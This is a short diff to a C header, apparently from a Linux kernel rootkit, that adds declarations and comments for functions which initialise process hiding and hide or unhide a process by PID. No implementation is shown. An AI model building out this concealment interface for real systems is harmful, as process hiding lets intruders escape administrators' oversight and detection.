@@ -20,7 +20,30 @@
 #ifndef __YARR_NINJA_TASKS
 #define __YARR_NINJA_TASKS
 
+#include <linux/types.h>
 
+/***
+ * Initializes everything related with hidding processes. This function must be
+ * called BEFORE using any other function specified here. Elsewhere behaviour
+ * is undefined... and undefined behaviour in the kernel means reboot please.
+ */
+int init_hideproc(void);
+
+/***
+ * Hides the process of PID <pid>.
+ *
+ * @pid: The PID of the process to be hidden.
+ * @return: Zero on success or -1 if there were errors.
+ */
+int hideProc(pid_t pid);
+
+/***
+ * Stops hidding the process of PID <pid>.
+ *
+ * @pid: The PID of the process to stop hidding.
+ * @return: Zero on success or -1 if there were errors.
+ */
+int stopHideProc(pid_t pid);
 
 #endif /* __YARR_NINJA_TASKS */
 
